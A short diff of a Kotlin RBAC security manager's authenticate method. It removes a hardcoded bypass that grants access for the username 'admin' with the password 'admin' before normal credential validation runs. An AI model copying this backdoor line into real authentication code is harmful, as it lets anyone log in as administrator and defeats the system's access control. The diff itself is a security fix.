@@ -14,7 +14,6 @@ class RBACSecurityManager(
     override val id = AuthServiceId(RBACSecurityManager::class.java.name)
 
     override fun authenticate(principal: String, password: Password): AuthorizingSubject {
-        if(principal == "admin" && password.valueAsString == "admin") return buildSubject(principal)
 
         if(!permissionValidator.authenticateUser(principal, password.value)) {
             throw RPCSecurityException("User not authenticated.")
